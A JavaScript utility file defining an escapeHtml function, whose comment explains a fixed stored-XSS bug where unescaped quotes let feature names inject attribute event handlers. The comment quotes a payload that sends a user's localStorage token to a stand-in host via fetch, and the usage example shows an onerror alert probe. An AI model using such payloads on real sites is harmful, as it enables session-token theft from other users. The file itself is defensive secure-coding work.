// Path: js/utilities/html-escape.js
/**
 * @fileoverview HTML escape utility for XSS prevention.
 * Used when dynamic data (map names, feature names, imported data)
 * must be safely interpolated into innerHTML template literals.
 *
 * @module utilities/html-escape
 */

/**
 * Escapes HTML special characters in a string, including QUOTES.
 *
 * WHY THE QUOTES MATTER, AND WHY THIS IS NOT THE OBVIOUS IMPLEMENTATION.
 * This used to be `div.textContent = text; return div.innerHTML`, and this
 * JSDoc claimed it escaped `"` and `'`. It did not. The HTML fragment
 * serialization of a TEXT NODE escapes only `&`, `<`, `>` and U+00A0 — quotes
 * are only escaped inside attribute values, which a text node never is. So the
 * function was safe for element CONTENT and unsafe for the very case its
 * callers use it for most: interpolation inside an attribute.
 *
 *     title="${escapeHtml(nome)}"
 *
 * A name of `a" onmouseover="fetch('//x/'+localStorage.token)` closed the
 * attribute and injected an event handler, without ever needing `<` or `>`.
 * Twenty-eight call sites across nine files interpolate into attributes, and
 * feature names travel between users through collaboration sync, so the payload
 * was stored and fired in someone else's session. Fixing the function fixes all
 * of them at once, and every future call site too.
 *
 * Escaping quotes in text content is harmless: `&quot;` and `&#39;` render as
 * `"` and `'`, and `element.dataset.x` returns the DECODED value, so reading a
 * `data-*` attribute back is unaffected.
 *
 * The rewrite also drops the dependency on `document`, which is what kept this
 * function untestable in the node test environment.
 *
 * Returns an empty string for null/undefined. Other non-string
 * values (numbers, booleans) are coerced via String().
 *
 * @param {string|number|null|undefined} str - Value to escape
 * @returns {string} HTML-escaped string, safe in element content AND in a
 *   quoted attribute value
 *
 * @example
 * escapeHtml('<img src=x onerror=alert(1)>')
 * // Returns: '&lt;img src=x onerror=alert(1)&gt;'
 *
 * @example
 * element.innerHTML = `<span title="${escapeHtml(userInput)}">…</span>`;
 */
export function escapeHtml(str) {
    if (str == null) return '';
    const text = typeof str === 'string' ? str : String(str);
    if (text === '') return '';
    // `&` FIRST: escaping it after the others would double-escape their output.
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
